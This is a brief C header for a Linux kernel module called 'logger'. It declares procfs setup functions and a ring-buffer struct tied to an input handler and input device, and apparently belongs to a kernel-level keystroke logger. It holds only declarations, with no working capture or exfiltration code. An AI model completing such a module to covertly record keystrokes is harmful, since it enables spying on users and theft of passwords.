#ifndef KBDV2_H
#define KBDV2_H

#include <linux/kernel.h>
#include <linux/string.h>	/* Cannot use C library... */
#include <linux/ktime.h>
#include <linux/kobject.h>
#include <linux/input.h>

int 	procFsInit(void);
void	procFsCleanup(void);

struct logbuf {
	int 	capacity;
	
	atomic_t 	wHead;
	atomic_t 	rHead;
	
	struct input_handler 	inputHandler;
	struct input_dev 			*device;
	
	char payload[ 10 ];
	
};

extern struct logbuf core;

#define SYS_MODULE_NAME "logger"

#endif
